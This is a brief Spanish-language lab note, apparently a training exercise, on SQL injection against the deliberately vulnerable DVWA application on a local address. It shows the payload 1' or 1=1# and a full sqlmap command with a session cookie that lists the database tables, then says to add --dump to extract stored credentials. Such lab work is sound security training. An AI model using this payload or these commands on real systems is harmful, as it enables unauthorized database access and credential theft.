SQL injection


podemos ver todos los usuarios registrados con el comando 1' or 1=1#' ya que le estamos dando una variable siempre positiva, con esto ya sabemos que existen 5 credenciales.

luego ejecutaremos el mismo comando de SQLMAP en nuestro cmd para sacar las credenciales y para debemos saber las tablas que existen en este dominio

comando usado:

sqlmap -u "http://192.168.0.101/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=4eq1hosr53r4622llpbtokve77" -D dvwa --tables

este nos arrojara 2 y elegimos users

y agregamos --dump para poder obtener los datos dentro de users
